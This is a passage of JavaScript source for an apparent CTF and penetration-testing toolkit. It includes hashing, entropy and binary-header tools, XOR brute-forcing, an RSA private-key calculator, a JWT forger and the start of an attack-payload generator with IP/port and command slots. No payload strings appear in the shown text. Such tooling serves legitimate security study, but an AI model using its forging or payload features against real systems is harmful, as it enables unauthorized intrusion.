                  a=hh(a,b,c,d,x[9],4,-640364487); d=hh(d,a,b,c,x[12],11,-421815835); c=hh(c,d,a,b,x[15],16,530742520); b=hh(b,c,d,a,x[2],23,-995338651);
                  a=ii(a,b,c,d,x[0],6,-198630844); d=ii(d,a,b,c,x[7],10,1126891415); c=ii(c,d,a,b,x[14],15,-1416354905); b=ii(b,c,d,a,x[5],21,-57434055);
                  a=ii(a,b,c,d,x[12],6,1700485571); d=ii(d,a,b,c,x[3],10,-1894986606); c=ii(c,d,a,b,x[10],15,-1051523); b=ii(b,c,d,a,x[1],21,-2054922799);
                  a=ii(a,b,c,d,x[8],6,1873313359); d=ii(d,a,b,c,x[15],10,-30611744); c=ii(c,d,a,b,x[6],15,-1560198380); b=ii(b,c,d,a,x[13],21,1309151649);
                  a=ii(a,b,c,d,x[4],6,-145523070); d=ii(d,a,b,c,x[11],10,-1120210379); c=ii(c,d,a,b,x[2],15,718787259); b=ii(b,c,d,a,x[9],21,-343485551);
                  a=(a+aa)&0xFFFFFFFF; b=(b+bb)&0xFFFFFFFF; c=(c+cc)&0xFFFFFFFF; d=(d+dd)&0xFFFFFFFF;
                }
                const out = new Uint8Array(16);
                const words=[a,b,c,d];
                for(let i=0;i<4;i++){
                  out[i*4]=words[i]&0xFF;
                  out[i*4+1]=(words[i]>>>8)&0xFF;
                  out[i*4+2]=(words[i]>>>16)&0xFF;
                  out[i*4+3]=(words[i]>>>24)&0xFF;
                }
                return out;
              }
              return function(u8){ return bytesToHex(md5bytes(u8)); };
            })();

            const digestHex = async (algo, u8) => {
                const buf = await crypto.subtle.digest(algo, u8);
                return bytesToHex(new Uint8Array(buf));
            };

            const computeHashes = async () => {
                if (!fileBytes) { setOutput('Load a file first.'); return; }
                setOutput('Computing hashesâ€¦');
                try {
                    const md5h = md5(fileBytes);
                    const sha1 = await digestHex('SHA-1', fileBytes);
                    const sha256 = await digestHex('SHA-256', fileBytes);
                    setOutput(`MD5:    ${md5h}\nSHA1:   ${sha1}\nSHA256: ${sha256}`);
                } catch (e) {
                    console.error(e);
                    setOutput('Hashing failed (browser crypto not available).');
                }
            };

            // ---- Entropy graph ----
            const calcEntropy = (u8) => {
                const freq = new Array(256).fill(0);
                for (let i=0;i<u8.length;i++) freq[u8[i]]++;
                const n = u8.length;
                let h = 0;
                for (let i=0;i<256;i++){
                    if (!freq[i]) continue;
                    const p = freq[i] / n;
                    h -= p * Math.log2(p);
                }
                return h;
            };
            const drawEntropy = (canvasId='entropyCanvas') => {
                const c = document.getElementById(canvasId);
                if (!c || !fileBytes) return;
                const ctx = c.getContext('2d');
                const w = c.width, h = c.height;
                ctx.clearRect(0,0,w,h);

                const block = 1024;
                const vals = [];
                for (let i=0;i<fileBytes.length;i+=block){
                    vals.push(calcEntropy(fileBytes.slice(i, Math.min(i+block, fileBytes.length))));
                }
                const max = 8.0;
                // axes
                ctx.globalAlpha = 0.35;
                ctx.fillStyle = '#00ff41';
                ctx.fillRect(0,h-1,w,1);
                ctx.globalAlpha = 1.0;

                ctx.strokeStyle = '#00ff41';
                ctx.beginPath();
                for (let i=0;i<vals.length;i++){
                    const x = (i/(vals.length-1 || 1)) * (w-2) + 1;
                    const y = h - ((vals[i]/max) * (h-10) + 5);
                    if (i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);
                }
                ctx.stroke();

                // label
                ctx.fillStyle = '#e0e0e0';
                ctx.font = '12px monospace';
                ctx.fillText(`Blocks: ${vals.length} (1KB)`, 8, 16);
            };

            // ---- PE/ELF header quick view ----
            const parseHeaders = () => {
                if (!fileBytes) { setOutput('Load a file first.'); return; }
                const u8 = fileBytes;
                const dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);
                const hex4 = (v) => '0x' + v.toString(16);
                const readU16 = (o) => dv.getUint16(o, true);
                const readU32 = (o) => dv.getUint32(o, true);
                const readU64 = (o) => Number(dv.getBigUint64(o, true));
                const head = String.fromCharCode(...u8.slice(0,4));

                // ELF
                if (u8[0]===0x7f && u8[1]===0x45 && u8[2]===0x4c && u8[3]===0x46) {
                    const cls = u8[4]===1 ? 'ELF32' : (u8[4]===2 ? 'ELF64' : 'Unknown');
                    const endian = u8[5]===1 ? 'Little' : (u8[5]===2 ? 'Big' : 'Unknown');
                    let entry = 0;
                    try { entry = (u8[4]===2) ? readU64(0x18) : readU32(0x18); } catch(e){}
                    setOutput(`ELF Header\nClass: ${cls}\nEndian: ${endian}\nEntry: ${hex4(entry)}\n`);
                    return;
                }

                // PE (MZ + PE\0\0)
                if (u8[0]===0x4d && u8[1]===0x5a) {
                    const e_lfanew = readU32(0x3c);
                    if (e_lfanew > 0 && e_lfanew + 4 < u8.length) {
                        const sig = String.fromCharCode(...u8.slice(e_lfanew, e_lfanew+4));
                        if (sig === 'PE\u0000\u0000') {
                            const machine = readU16(e_lfanew + 4);
                            const sections = readU16(e_lfanew + 6);
                            const optMagic = readU16(e_lfanew + 24);
                            const isPE32Plus = optMagic === 0x20b;
                            const entryRVA = readU32(e_lfanew + 40);
                            let imageBase = 0;
                            try {
                                imageBase = isPE32Plus ? readU64(e_lfanew + 24 + 24) : readU32(e_lfanew + 24 + 28);
                            } catch(e){}
                            setOutput(`PE Header\nMachine: ${hex4(machine)}\nSections: ${sections}\nPE: ${isPE32Plus ? 'PE32+' : 'PE32'}\nEntryRVA: ${hex4(entryRVA)}\nImageBase: ${hex4(imageBase)}\n`);
                            return;
                        }
                    }
                }

                setOutput('Unknown file format (not ELF/PE).');
            };

            // ---- Byte pattern finder ----
            const findPattern = () => {
                if (!fileBytes) { setOutput('Load a file first.'); return; }
                const clean = (patternHex || '').replace(/[^0-9a-f]/gi,'').toLowerCase();
                if (clean.length < 2 || clean.length % 2 !== 0) { setPatternResults('Enter an even-length hex pattern.'); return; }
                const pat = new Uint8Array(clean.length/2);
                for (let i=0;i<pat.length;i++) pat[i] = parseInt(clean.substr(i*2,2),16);
                const hits = [];
                const u8 = fileBytes;
                outer: for (let i=0;i<=u8.length-pat.length;i++){
                    for (let j=0;j<pat.length;j++){ if (u8[i+j] !== pat[j]) continue outer; }
                    hits.push(i);
                    if (hits.length >= 200) break;
                }
                const txt = hits.length ? hits.map(o => `0x${o.toString(16)} (${o})`).join('\n') : 'No matches';
                setPatternResults(txt);
                setOutput(`Pattern hits: ${hits.length}\n\n${txt}`);
            };


            
            // Tool-specific state (declared unconditionally to keep hook order stable)
            const [detectedEncoding, setDetectedEncoding] = useState('');
            const [hashInfo, setHashInfo] = useState(null);
            const [results, setResults] = useState([]);
            const [shift, setShift] = useState(13);
            const [keyword, setKeyword] = useState('');
            const [rsaN, setRsaN] = useState('');
            const [rsaE, setRsaE] = useState('65537');
            const [rsaP, setRsaP] = useState('');
            const [rsaQ, setRsaQ] = useState('');
            const [jwtHeader, setJwtHeader] = useState('');
            const [jwtPayload, setJwtPayload] = useState('');
            const [jwtSig, setJwtSig] = useState('');
            const [payloadType, setPayloadType] = useState('sqli');
            const [payloadQuery, setPayloadQuery] = useState('');
            const [payloadEncoding, setPayloadEncoding] = useState('none');
            const [payloadTarget, setPayloadTarget] = useState('https://target.local');
            const [payloadParam, setPayloadParam] = useState('q');
            const [payloadCmd, setPayloadCmd] = useState('id');
            const [payloadIP, setPayloadIP] = useState('10.10.10.10');
            const [payloadPort, setPayloadPort] = useState('4444');
            const [hexData, setHexData] = useState('');
            const [minLen, setMinLen] = useState(4);
            const [num, setNum] = useState('');
            const [num2, setNum2] = useState('');
            const [op, setOp] = useState('and');
            const [domain, setDomain] = useState('example.com');
            const [country, setCountry] = useState('+1');
            // Elite utilities state
            const [regexPattern, setRegexPattern] = useState('');
            const [regexFlags, setRegexFlags] = useState('g');
            const [entropyScore, setEntropyScore] = useState('');
            const [iocMode, setIocMode] = useState('defang');
            const [tsInput, setTsInput] = useState('');
            const [cidrIp, setCidrIp] = useState('');
            const [cidrPrefix, setCidrPrefix] = useState('24');

            const copyToClipboard = async (text) => {
                try {
                    if (!text) return;
                    if (navigator.clipboard && window.isSecureContext) {
                        await navigator.clipboard.writeText(text);
                    } else {
                        const ta = document.createElement('textarea');
                        ta.value = text;
                        ta.style.position = 'fixed';
                        ta.style.left = '-9999px';
                        document.body.appendChild(ta);
                        ta.focus();
                        ta.select();
                        document.execCommand('copy');
                        document.body.removeChild(ta);
                    }
                } catch (e) {}
            };

// MULTI-CODEC ENGINE
            if (tool === 'multi-codec') {
const encodings = [
                    { id: 'base64', name: 'Base64', encode: (s) => btoa(s), decode: (s) => atob(s) },
                    { id: 'hex', name: 'Hex', encode: (s) => Array.from(s).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''), decode: (s) => (s.match(/.{2}/g) || []).map(h => String.fromCharCode(parseInt(h, 16))).join('') },
                    { id: 'url', name: 'URL', encode: encodeURIComponent, decode: decodeURIComponent },
                    { id: 'rot13', name: 'ROT13', encode: (s) => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))), decode: (s) => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))) },
                    { id: 'binary', name: 'Binary', encode: (s) => s.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '), decode: (s) => s.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join('') },
                    { id: 'morse', name: 'Morse', encode: (s) => { const m = {'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.', ' ':'/'}; return s.toUpperCase().split('').map(c => m[c] || c).join(' '); }, decode: (s) => { const m = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9','/':' '}; return s.split(' ').map(code => m[code] || code).join(''); }}
                ];
                const detectEncoding = (str) => { if (/^[A-Za-z0-9+/]+=*$/.test(str) && str.length % 4 === 0) return 'base64'; if (/^[0-9a-fA-F]+$/.test(str)) return 'hex'; if (/%[0-9A-F]{2}/.test(str)) return 'url'; if (/^[01\s]+$/.test(str)) return 'binary'; if (/^[.-\/\s]+$/.test(str)) return 'morse'; return 'unknown'; };
                const handleEncode = (enc) => { try { setOutput(encodings.find(e => e.id === enc).encode(input)); } catch(err) { setOutput('Error: ' + err.message); }};
                const handleDecode = (enc) => { try { setOutput(encodings.find(e => e.id === enc).decode(input)); } catch(err) { setOutput('Error: ' + err.message); }};
                const autoDetect = () => { const d = detectEncoding(input); setDetectedEncoding(d); if (d !== 'unknown') handleDecode(d); else setOutput('Unable to detect'); };
                return e('div', { className: 'space-y-4' },
                    e('div', { className: 'flex items-center justify-between mb-4' },
                        e('h3', { className: 'text-lg font-bold', style: { color }}, 'Multi-Codec Engine'),
                        e('button', { onClick: autoDetect, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] text-sm font-bold'}, e(icons.Fingerprint, { className: 'w-4 h-4 inline mr-2' }), 'AUTO-DETECT')
                    ),
                    detectedEncoding && detectedEncoding !== 'unknown' && e('div', { className: 'bg-[#00ff41]/10 border border-[#00ff41]/30 rounded p-3 text-sm' }, e('strong', { className: 'text-[#00ff41]' }, 'Detected: '), detectedEncoding.toUpperCase()),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'INPUT'), e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Enter text...' })),
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'OUTPUT'), e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Output...' }))
                    ),
                    e('div', { className: 'grid grid-cols-3 gap-2' }, ...encodings.map(enc => e('div', { key: enc.id, className: 'flex gap-2' }, e('button', { onClick: () => handleEncode(enc.id), className: 'flex-1 px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, `â†’ ${enc.name}`), e('button', { onClick: () => handleDecode(enc.id), className: 'flex-1 px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, `â† ${enc.name}`))))
                );
            }

            // HASH ANALYZER
            if (tool === 'hash-analysis') {
const hashPatterns = [{ name: 'MD5', regex: /^[a-f0-9]{32}$/i }, { name: 'SHA-1', regex: /^[a-f0-9]{40}$/i }, { name: 'SHA-256', regex: /^[a-f0-9]{64}$/i }, { name: 'SHA-512', regex: /^[a-f0-9]{128}$/i }];
                const analyzeHash = () => { const t = input.trim(); const m = hashPatterns.filter(p => p.regex.test(t)); if (m.length > 0) { setHashInfo({ length: t.length, possibleTypes: m.map(x => x.name) }); setOutput(`Identified: ${m.map(x => x.name).join(' or ')}\nLength: ${t.length}`); } else { setOutput('Unknown hash type'); }};
                const generateHash = (algo) => { try { let h; switch(algo) { case 'MD5': h = CryptoJS.MD5(input).toString(); break; case 'SHA-1': h = CryptoJS.SHA1(input).toString(); break; case 'SHA-256': h = CryptoJS.SHA256(input).toString(); break; case 'SHA-512': h = CryptoJS.SHA512(input).toString(); break; } setOutput(h); } catch(e) { setOutput('Error'); }};
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Hash Analyzer'),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'INPUT'), e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' })),
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'OUTPUT'), e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }))
                    ),
                    e('div', { className: 'flex gap-4' },
                        e('div', { className: 'flex-1' }, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'ANALYZE'), e('button', { onClick: analyzeHash, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, e(icons.Eye, { className: 'w-4 h-4 inline mr-2' }), 'IDENTIFY')),
                        e('div', { className: 'flex-1' }, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'GENERATE'), e('div', { className: 'grid grid-cols-2 gap-2' }, ['MD5', 'SHA-1', 'SHA-256', 'SHA-512'].map(a => e('button', { key: a, onClick: () => generateHash(a), className: 'px-3 py-2 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-xs font-bold' }, a))))
                    ),
                    hashInfo && e('div', { className: 'bg-[#00ff41]/10 border border-[#00ff41]/30 rounded p-4' }, e('h4', { className: 'text-sm font-bold mb-2 text-[#00ff41]' }, 'INFO'), e('div', { className: 'text-sm font-mono' }, e('div', null, 'Types: ', hashInfo.possibleTypes.join(', ')), e('div', null, 'Length: ', hashInfo.length)))
                );
            }

            // XOR BRUTEFORCE
            if (tool === 'xor-bruteforce') {
const xorBruteforce = () => { const r = []; for (let k = 0; k < 256; k++) { let d = '', s = 0; for (let i = 0; i < input.length; i++) { const c = input.charCodeAt(i) ^ k; d += String.fromCharCode(c); if (c >= 32 && c <= 126) s += 1; if ('etaoinshrdlu'.includes(String.fromCharCode(c).toLowerCase())) s += 2; } r.push({ key: k.toString(16).padStart(2, '0'), keyDec: k, score: s, preview: d.substring(0, 80) }); } r.sort((a, b) => b.score - a.score); setResults(r.slice(0, 15)); setOutput('Top 15 results'); };
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'XOR Bruteforce'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('button', { onClick: xorBruteforce, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, e(icons.Zap, { className: 'w-4 h-4 inline mr-2' }), 'BRUTEFORCE (0x00-0xFF)'),
                    results.length > 0 && e('div', { className: 'bg-black/50 border border-gray-700 rounded p-4 max-h-80 overflow-y-auto' }, e('div', { className: 'space-y-2' }, ...results.map((r, i) => e('div', { key: i, className: 'bg-[#0f1419] border border-gray-800 rounded p-3 hover:border-[#00ff41]/50 cursor-pointer', onClick: () => setOutput(r.preview) }, e('div', { className: 'flex justify-between mb-1' }, e('span', { className: 'text-[#00ff41] text-xs font-bold' }, `Key: 0x${r.key} (${r.keyDec})`), e('span', { className: 'text-gray-400 text-xs' }, `Score: ${r.score}`)), e('div', { className: 'text-xs font-mono text-gray-300 truncate' }, r.preview))))),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }
            // CLASSICAL CIPHER
            if (tool === 'classical-cipher') {
const caesarCipher = (text, s, d = false) => { const sh = d ? (26 - (s % 26)) : (s % 26); return text.replace(/[a-zA-Z]/g, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + sh) % 26) + b); }); };
                const vigenereCipher = (text, key, d = false) => { let res = '', ki = 0; const uk = key.toUpperCase(); for (let i = 0; i < text.length; i++) { const c = text[i]; if (/[a-zA-Z]/.test(c)) { const b = c <= 'Z' ? 65 : 97; const cc = c.toUpperCase().charCodeAt(0) - 65; const kc = uk.charCodeAt(ki % uk.length) - 65; const sh = d ? (cc - kc + 26) % 26 : (cc + kc) % 26; res += String.fromCharCode(sh + b); ki++; } else { res += c; }} return res; };
                const freqAnalysis = (t) => { const f = {}; const l = t.toUpperCase().replace(/[^A-Z]/g, ''); for (let c of l) { f[c] = (f[c] || 0) + 1; } const s = Object.entries(f).sort((a, b) => b[1] - a[1]); return s.slice(0, 10).map(([c, n]) => `${c}: ${n} (${(n/l.length*100).toFixed(1)}%)`).join('\n'); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Classical Cipher Lab'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }), e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'CAESAR'), e('input', { type: 'number', value: shift, onChange: (ev) => setShift(parseInt(ev.target.value) || 0), min: 0, max: 25, className: 'w-20 px-3 py-2 mb-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('div', { className: 'flex gap-2' }, e('button', { onClick: () => setOutput(caesarCipher(input, shift)), className: 'flex-1 px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'ENC'), e('button', { onClick: () => setOutput(caesarCipher(input, shift, true)), className: 'flex-1 px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'DEC'))),
                        e('div', null, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'VIGENÃˆRE'), e('input', { type: 'text', value: keyword, onChange: (ev) => setKeyword(ev.target.value), className: 'w-full px-3 py-2 mb-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none' }), e('div', { className: 'flex gap-2' }, e('button', { onClick: () => keyword && setOutput(vigenereCipher(input, keyword)), className: 'flex-1 px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, 'ENC'), e('button', { onClick: () => keyword && setOutput(vigenereCipher(input, keyword, true)), className: 'flex-1 px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, 'DEC')))
                    ),
                    e('button', { onClick: () => setOutput(freqAnalysis(input)), className: 'w-full px-4 py-3 bg-[#00ff41]/20 border border-[#00ff41] rounded text-[#00ff41] font-bold' }, 'FREQUENCY ANALYSIS')
                );
            }

            // RSA CALCULATOR
            if (tool === 'rsa-toolkit') {
                const gcd = (a, b) => b === 0 ? a : gcd(b, a % b);
                const modInverse = (a, m) => { let [or, r] = [a, m]; let [os, s] = [1, 0]; while (r !== 0) { const q = Math.floor(or / r); [or, r] = [r, or - q * r]; [os, s] = [s, os - q * s]; } return os < 0 ? os + m : os; };
                const factorN = () => { const mod = parseInt(rsaN); if (isNaN(mod) || mod < 4) { setOutput('Invalid'); return; } for (let i = 2; i <= Math.sqrt(mod); i++) { if (mod % i === 0) { setRsaP(i.toString()); setRsaQ((mod/i).toString()); setOutput(`p = ${i}\nq = ${mod/i}`); return; }} setOutput('Cannot factor'); };
                const calcPrivate = () => { const pv = parseInt(rsaP), qv = parseInt(rsaQ), ev = parseInt(rsaE); if (isNaN(pv) || isNaN(qv) || isNaN(ev)) { setOutput('Invalid'); return; } const nc = pv * qv; const phi = (pv - 1) * (qv - 1); if (gcd(ev, phi) !== 1) { setOutput('e and Ï†(n) not coprime'); return; } const d = modInverse(ev, phi); setRsaN(nc.toString()); setOutput(`n = ${nc}\nÏ†(n) = ${phi}\nd = ${d}`); };
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'RSA Calculator'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('input', { type: 'text', value: rsaN, onChange: (ev) => setRsaN(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'n' }), e('input', { type: 'text', value: rsaE, onChange: (ev) => setRsaE(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'e' })),
                    e('button', { onClick: factorN, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'FACTOR n'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('input', { type: 'text', value: rsaP, onChange: (ev) => setRsaP(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'p' }), e('input', { type: 'text', value: rsaQ, onChange: (ev) => setRsaQ(ev.target.value), className: 'px-3 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'q' })),
                    e('button', { onClick: calcPrivate, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, 'CALC PRIVATE KEY'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // JWT TOOLKIT
            if (tool === 'jwt-toolkit') {
                const decodeJWT = () => { try { const parts = input.split('.'); if (parts.length !== 3) { setOutput('Invalid JWT'); return; } const h = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/'))); const p = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/'))); setJwtHeader(JSON.stringify(h, null, 2)); setJwtPayload(JSON.stringify(p, null, 2)); setJwtSig(parts[2]); setOutput('Decoded'); } catch(e) { setOutput('Error: ' + e.message); }};
                const forgeJWT = () => { try { const h = JSON.parse(jwtHeader); const p = JSON.parse(jwtPayload); const b64url = (s) => btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''); const nh = b64url(JSON.stringify(h)); const np = b64url(JSON.stringify(p)); setOutput(`${nh}.${np}.${jwtSig}`); } catch(e) { setOutput('Error'); }};
                return e('div', { className: 'space-y-4' }, e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'JWT Swiss Army Knife'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-20 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Paste JWT...' }),
                    e('button', { onClick: decodeJWT, className: 'w-full px-4 py-3 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-[#00d9ff] font-bold' }, e(icons.Key, { className: 'w-4 h-4 inline mr-2' }), 'DECODE'),
                    e('div', { className: 'grid grid-cols-2 gap-4' }, e('textarea', { value: jwtHeader, onChange: (ev) => setJwtHeader(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-xs font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Header' }), e('textarea', { value: jwtPayload, onChange: (ev) => setJwtPayload(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-xs font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Payload' })),
                    e('input', { type: 'text', value: jwtSig, onChange: (ev) => setJwtSig(ev.target.value), className: 'w-full px-4 py-2 bg-black/50 border border-gray-700 rounded font-mono text-sm focus:border-[#00ff41] focus:outline-none', placeholder: 'Signature' }),
                    e('button', { onClick: forgeJWT, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, 'FORGE'),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }

            // PAYLOAD GENERATOR
if (tool === 'payload-gen') {
    // NOTE: This library is intended for authorized testing / CTF use. Avoid using against systems you don't own or have permission to test.
    const encodeHtml = (s) => (s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    const base64Encode = (s) => {
        try {
            const bytes = new TextEncoder().encode(s ?? '');
            let binary = '';
            for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
            return btoa(binary);
        } catch (e) { return ''; }
    };
    const applyEncoding = (s) => {
        if (payloadEncoding === 'url') return encodeURIComponent(s);
        if (payloadEncoding === 'html') return encodeHtml(s);
        if (payloadEncoding === 'base64') return base64Encode(s);
        return s;
    };
    const fill = (s) => (s ?? '')
        .replace(/\{TARGET\}/g, payloadTarget)
        .replace(/\{PARAM\}/g, payloadParam)
        .replace(/\{CMD\}/g, payloadCmd)
        .replace(/\{IP\}/g, payloadIP)
        .replace(/\{PORT\}/g, payloadPort)
        .replace(/\{DOMAIN\}/g, domain);

    const library = loadPayloadLibrary();


    const types = Object.keys(library);
    const q = payloadQuery.trim().toLowerCase();
    const entries = (library[payloadType] || []).filter(x => {
        if (!q) return true;
        const blob = `${x.name} ${x.payload} ${x.tags} ${x.notes}`.toLowerCase();
        return blob.includes(q);
    });

    const onSelect = (tpl) => {
        const rendered = fill(tpl.payload);
        const finalPayload = applyEncoding(rendered);
        setInput(finalPayload);
    };

    const pill = (active) => `px-3 py-2 rounded font-bold text-xs ${active ? 'bg-[#00ff41]/20 border border-[#00ff41] text-[#00ff41]' : 'bg-gray-700/20 border border-gray-600 text-gray-400 hover:border-[#00ff41]/40'}`;

    return e('div', { className: 'space-y-4' },
        e('div', { className: 'flex items-center justify-between gap-2' },
            e('h3', { className: 'text-lg font-bold', style: { color } }, 'Payload Generator (Elite)'),
            e('button', { onClick: () => copyToClipboard(input), className: 'px-3 py-2 bg-[#00ff41]/20 border border-[#00ff41] rounded text-xs font-bold text-[#00ff41] hover:bg-[#00ff41]/30' }, 'COPY')
        ),

        e('div', { className: 'grid grid-cols-1 lg:grid-cols-3 gap-3' },
            // LEFT: Types
            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-2' },
                e('div', { className: 'text-xs text-gray-400 mb-2' }, 'Payload Type'),
                e('div', { className: 'grid grid-cols-2 gap-2' },
                    ...types.map(t => e('button', { key: t, onClick: () => setPayloadType(t), className: pill(payloadType === t) }, t.toUpperCase()))
                ),
                e('div', { className: 'mt-2 text-[11px] text-gray-500 leading-snug' },
                    'Templates support: {TARGET}, {PARAM}, {CMD}, {IP}, {PORT}, {DOMAIN}.'
                )
            ),

            // MIDDLE: Controls
            e('div', { className: 'bg-black/30 border border-gray-700 rounded p-3 space-y-3' },
                e('div', { className: 'text-xs text-gray-400' }, 'Search / Encode'),
                e('input', {
                    type: 'text',
                    value: payloadQuery,
                    onChange: (ev) => setPayloadQuery(ev.target.value),
                    placeholder: 'Search (e.g., union, time, windows, meta-data)...',
                    className: 'w-full px-3 py-2 bg-black/50 border border-gray-700 rounded text-sm font-mono focus:border-[#00ff41] focus:outline-none'
                }),
                e('div', { className: 'grid grid-cols-2 gap-2' },
